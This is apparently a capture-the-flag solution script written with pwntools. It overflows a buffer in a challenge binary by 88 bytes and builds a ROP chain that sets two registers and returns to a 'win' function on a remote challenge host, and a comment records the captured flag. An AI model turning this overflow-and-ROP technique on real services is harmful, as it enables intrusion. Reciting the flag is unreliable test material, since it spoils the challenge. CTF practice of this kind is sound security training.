from pwn import *
elf = context.binary = ELF("./chall")
# p = process()
p = remote("ctf-chall.stembascc.com",5211)
offset = 88
rop = ROP(context.binary)
win = elf.sym['win']
rop.raw(b"A" * offset)
rop.rdi = 0xdeadbeef
rop.rsi = 0xdeadc0de
rop.raw(win)
p.sendline(rop.chain())
p.interactive()

# Flag: SELEKSI{r3t2win_w_p4rameters}